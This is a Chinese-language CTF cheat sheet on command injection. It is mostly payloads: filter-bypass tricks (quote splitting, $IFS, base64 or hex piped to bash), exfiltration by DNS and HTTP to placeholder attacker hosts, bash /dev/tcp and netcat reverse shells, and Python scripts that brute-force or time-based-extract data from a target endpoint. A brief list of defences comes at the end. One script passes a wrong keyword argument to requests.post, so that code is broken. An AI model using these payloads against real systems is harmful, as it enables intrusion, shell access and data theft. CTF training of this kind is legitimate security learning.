# Web CTF - 命令注入绕过技巧

## 题目类型
Web - 命令注入

## 基础概念

### 危险函数
```php
system()
exec()
shell_exec()
passthru()
popen()
proc_open()
`反引号`
```

### 命令连接符
```bash
;   # 顺序执行
&   # 后台执行
&&  # 前一个成功才执行后一个
|   # 管道
||  # 前一个失败才执行后一个
```

## 常见过滤绕过

### 1. 空格过滤
```bash
# 使用 $IFS
cat$IFS/flag
cat${IFS}/flag

# 使用 Tab
cat%09/flag

# 使用重定向
cat</flag

# 使用 {}
{cat,/flag}
```

### 2. 关键字过滤 (cat, flag, ls)
```bash
# 拼接
ca''t /flag
ca""t /flag
c\at /flag

# 变量
a=c;b=at;$a$b /flag

# 通配符
/bin/c?t /fl*
/bin/c[a]t /fla[g]

# Base64 编码
echo Y2F0IC9mbGFn | base64 -d | bash

# 十六进制
echo -e "\x63\x61\x74\x20\x2f\x66\x6c\x61\x67" | bash

# 反转
rev<<<'galf/ tac' | bash
```

### 3. 斜杠过滤
```bash
# 使用环境变量
cat $HOME/../flag
cat ${PATH:0:1}flag  # 提取 PATH 第一个字符 /

# 使用 pwd
cat $(pwd)flag
```

### 4. 分号过滤
```bash
# 使用换行符
%0a
%0d

# 使用 &&
command1&&command2

# 使用 |
command1|command2
```

### 5. 引号过滤
```bash
# 使用反斜杠
c\at /flag

# 使用 $@
c$@at /flag
```

## 无回显命令执行

### 1. DNS 外带
```bash
curl `whoami`.your-domain.com
ping `whoami`.your-domain.com
```

### 2. HTTP 外带
```bash
curl http://your-server/$(cat /flag)
wget http://your-server/?data=$(cat /flag | base64)
```

### 3. 写入文件
```bash
cat /flag > /var/www/html/flag.txt
cat /flag > /tmp/flag.txt
```

### 4. 反弹 Shell
```bash
bash -i >& /dev/tcp/your-ip/port 0>&1
nc your-ip port -e /bin/bash
```

## 长度限制绕过

### 1. 使用 > 和 >>
```bash
# 分段写入
>a
>b
>c
ls -t>x  # 按时间排序写入 x
sh x     # 执行
```

### 2. 使用环境变量
```bash
a=cat
b=/flag
$a $b
```

## 实战 Payload

### 基础测试
```bash
; whoami
| whoami
& whoami
&& whoami
|| whoami
`whoami`
$(whoami)
```

### 读取文件
```bash
cat /flag
tac /flag
more /flag
less /flag
head /flag
tail /flag
nl /flag
od -c /flag
```

### 查找文件
```bash
find / -name flag
grep -r "flag{" /
locate flag
```

### 绕过示例
```bash
# 过滤空格和分号
cat</flag
{cat,/flag}

# 过滤 cat
ca''t /flag
c\at /flag
/bin/c?t /flag

# 过滤斜杠
cat $(pwd)flag
cat ${PATH:0:1}flag

# 组合绕过
c''a''t${IFS}${PATH:0:1}fl''ag
```

## Python 脚本示例

### 自动化测试
```python
import requests

url = "http://target.com/exec"
payloads = [
    "; cat /flag",
    "| cat /flag",
    "&& cat /flag",
    "|| cat /flag",
    "`cat /flag`",
    "$(cat /flag)",
]

for payload in payloads:
    data = {"cmd": f"ping{payload}"}
    r = requests.post(url, d=data)
    if "flag{" in r.text:
        print(f"[+] Success: {payload}")
        print(r.text)
        break
```

### 盲注脚本
```python
import requests
import string

url = "http://target.com/exec"
flag = ""

for i in range(1, 50):
    for c in string.printable:
        # 使用时间盲注
        payload = f"; if [ $(cat /flag | cut -c {i}) = '{c}' ]; then sleep 3; fi"
        data = {"cmd": f"ping{payload}"}

        try:
            r = requests.post(url, data=data, timeout=2)
        except requests.Timeout:
            flag += c
            print(f"[+] {flag}")
            break
```

## 常见题型

### 1. Ping 命令注入
```php
$ip = $_GET['ip'];
system("ping -c 1 " . $ip);
```

### 2. 文件名注入
```php
$file = $_GET['file'];
system("cat " . $file);
```

### 3. 参数注入
```php
$arg = $_GET['arg'];
system("ls " . $arg);
```

## 防御措施
1. 避免使用 system/exec 等函数
2. 使用白名单验证输入
3. 使用 escapeshellarg/escapeshellcmd
4. 使用参数化命令
5. 最小权限原则
